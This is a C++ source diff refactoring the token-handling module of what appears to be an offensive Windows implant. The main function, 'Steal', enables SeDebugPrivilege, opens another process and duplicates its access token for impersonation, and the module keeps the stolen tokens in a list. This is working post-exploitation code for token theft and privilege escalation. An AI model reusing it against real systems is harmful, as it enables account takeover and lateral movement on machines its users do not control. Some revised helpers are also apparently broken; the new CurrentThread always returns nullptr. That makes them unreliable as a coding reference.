@@ -5,32 +5,18 @@ using namespace Root;
 auto DECLFN Token::CurrentPs( VOID ) -> HANDLE {
     HANDLE hToken = nullptr;
     
-    if ( 
-        this->TdOpen( NtCurrentThread(), TOKEN_QUERY, FALSE, &hToken ) && 
-        hToken != INVALID_HANDLE_VALUE
-    ) {
-        return hToken;
-    }
+    this->TdOpen( NtCurrentThread(), TOKEN_QUERY, FALSE, &hToken );
+    this->ProcOpen( NtCurrentProcess(), TOKEN_QUERY, &hToken );
+
+    return hToken;
 }
 
 auto DECLFN Token::CurrentThread( VOID ) -> HANDLE {
     HANDLE hToken = nullptr;
+     
+    this->TdOpen( NtCurrentThread(), TOKEN_QUERY, FALSE, &hToken );
     
-    if ( 
-        this->TdOpen( NtCurrentThread(), TOKEN_QUERY, FALSE, &hToken ) && 
-        hToken != INVALID_HANDLE_VALUE
-    ) {
-        return hToken;
-    }
-    
-    if (
-        this->ProcOpen( NtCurrentProcess(), TOKEN_QUERY, &hToken ) && 
-        hToken != INVALID_HANDLE_VALUE
-    ) {
-        return hToken;
-    }
-    
-    return INVALID_HANDLE_VALUE;
+    return nullptr;
 }
 
 auto DECLFN Token::GetUser(
@@ -90,7 +76,7 @@ _KH_END:
         Self->Hp->Free( TokenUserPtr );
     }
 
-    if ( !Success ) {
+    if ( ! Success ) {
         Self->Hp->Free( UserDom );
         UserDom = nullptr;
     }
@@ -101,13 +87,16 @@ _KH_END:
 auto DECLFN Token::GetByID(
     _In_ ULONG TokenID
 ) -> HANDLE {
+    if ( ! this->Node ) {
+        return nullptr;
+    }
+
     TOKEN_NODE* Current = this->Node;
 
-    while ( Current->Next ) {
-        if ( TokenID == Current->TokenID ) {
+    while ( Current ) {  
+        if ( Current->TokenID == TokenID ) {
             return Current->Handle;
         }
-
         Current = Current->Next;
     }
 
@@ -121,35 +110,49 @@ auto DECLFN Token::Rev2Self( VOID ) -> BOOL {
 auto DECLFN Token::Rm(
     _In_ ULONG TokenID
 ) -> BOOL {
-    TOKEN_NODE* Current  = this->Node;
-    TOKEN_NODE* Previous = nullptr;
-
-    if ( !Current ) {
+    if ( ! this->Node ) {
         return FALSE;
     }
 
+    TOKEN_NODE* Current  = this->Node;
+    TOKEN_NODE* Previous = nullptr;
+
     if ( Current->TokenID == TokenID ) {
         this->Node = Current->Next;
-        Self->Ntdll.NtClose( Current->Handle );
-        Self->Hp->Free( Current->User );
-        Self->Hp->Free( Current);
+        
+        if ( Current->Handle && Current->Handle != INVALID_HANDLE_VALUE ) {
+            Self->Ntdll.NtClose(Current->Handle);
+        }
+        
+        if ( Current->User ) {
+            Self->Hp->Free( Current->User );
+        }
+        
+        Self->Hp->Free( Current );
         return TRUE;
     }
 
     while ( Current && Current->TokenID != TokenID ) {
         Previous = Current;
-        Current = Current->Next;
+        Current  = Current->Next;
     }
 
-    if ( Current ) {
-        Previous->Next = Current->Next;
-        Self->Ntdll.NtClose( Current->Handle );
+    if ( ! Current ) {
+        return FALSE;  
+    }
+
+    Previous->Next = Current->Next;
+
+    if ( Current->Handle && Current->Handle != INVALID_HANDLE_VALUE ) {
+        Self->Ntdll.NtClose(Current->Handle);
+    }
+    
+    if ( Current->User ) {
         Self->Hp->Free( Current->User );
-        Self->Hp->Free( Current );
-        return TRUE;
     }
-
-    return FALSE;
+    
+    Self->Hp->Free( Current );
+    return TRUE;
 }
 
 auto DECLFN Token::Use(
@@ -161,50 +164,72 @@ auto DECLFN Token::Use(
 auto DECLFN Token::Steal(
     _In_ ULONG ProcessID
 ) -> TOKEN_NODE* {
-    HANDLE TokenHandle   = INVALID_HANDLE_VALUE;
-    HANDLE ProcessHandle = INVALID_HANDLE_VALUE;
+    HANDLE      TokenHandle   = INVALID_HANDLE_VALUE;
+    HANDLE      ProcessHandle = INVALID_HANDLE_VALUE;
+    TOKEN_NODE* NewNode       = nullptr;
 
-    LONG  TokenFlags = TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY | TOKEN_DUPLICATE;
-    ULONG TokenID    = Rnd32() % 9999;
-
-    TokenHandle = this->CurrentThread();
-
-    this->SetPriv( TokenHandle, "SeDebugPrivilege" );
-
-    Self->Ntdll.NtClose( TokenHandle );
+    if ( TokenHandle = this->CurrentPs() ) {
+        KH_DBG_MSG
+        this->SetPriv( TokenHandle, "SeDebugPrivilege" );
+        KH_DBG_MSG
+        Self->Ntdll.NtClose( TokenHandle ); TokenHandle = nullptr;
+    }
 
     ProcessHandle = Self->Ps->Open( PROCESS_QUERY_INFORMATION, TRUE, ProcessID );
-    if ( ProcessHandle == INVALID_HANDLE_VALUE || !ProcessHandle ) return nullptr;
-
-    Self->Tkn->ProcOpen( ProcessHandle, TokenFlags, &TokenHandle );
-    if ( TokenHandle == INVALID_HANDLE_VALUE || !TokenHandle ) return nullptr;
-
-    TOKEN_NODE* NewNode = (TOKEN_NODE*)Self->Hp->Alloc( sizeof( TOKEN_NODE ) );
-
-    while( this->GetByID( TokenID ) ) {
-        TokenID = Rnd32() % 9999;
+    if ( ! ProcessHandle || ProcessHandle == INVALID_HANDLE_VALUE ) {
+        KH_DBG_MSG
+        goto CLEANUP;
     }
+
+    if ( ! this->ProcOpen( ProcessHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &TokenHandle ) ||
+        TokenHandle == INVALID_HANDLE_VALUE) {
+        KH_DBG_MSG
+        goto CLEANUP;
+    }
+
+    NewNode = (TOKEN_NODE*)Self->Hp->Alloc( sizeof( TOKEN_NODE ) );
+    if ( ! NewNode ) {
+        goto CLEANUP;
+    }
+
+    ULONG TokenID;
+
+    do {
+        TokenID = Rnd32() % 9999;
+    } while ( this->GetByID( TokenID ) ); 
 
     NewNode->Handle    = TokenHandle;
     NewNode->Host      = Self->Machine.CompName;
     NewNode->ProcessID = ProcessID;
     NewNode->User      = this->GetUser( TokenHandle );
     NewNode->TokenID   = TokenID;
+    NewNode->Next      = nullptr;
 
-    if ( !this->Node ) {
+    if ( ! this->Node ) {
         this->Node = NewNode;
     } else {
-        TOKEN_NODE* Current = this->Node;
-
-        while ( Current->Next ) {
-            Current = Current->Next;
+        TOKEN_NODE* LastNode = this->Node;
+        while ( LastNode->Next ) {
+            LastNode = LastNode->Next;
         }
-        Current->Next = NewNode;
+        LastNode->Next = NewNode;
     }
 
-    if ( ProcessHandle ) Self->Ntdll.NtClose( ProcessHandle );
-
     return NewNode;
+
+CLEANUP:
+    if ( TokenHandle != INVALID_HANDLE_VALUE ) {
+        Self->Ntdll.NtClose( TokenHandle );
+    }
+
+    if ( ProcessHandle != INVALID_HANDLE_VALUE ) {
+        Self->Ntdll.NtClose( ProcessHandle );
+    }
+
+    if ( NewNode ) {
+        Self->Hp->Free( NewNode );
+    }
+    return nullptr;
 }
 
 auto DECLFN Token::SetPriv(
@@ -299,7 +324,7 @@ auto DECLFN Token::ProcOpen(
         );
     }
 
-    Self->Usf->NtStatusToError(Status);
+    Self->Usf->NtStatusToError( Status );
 
-    return NT_SUCCESS(Status);
+    return NT_SUCCESS( Status );
 }
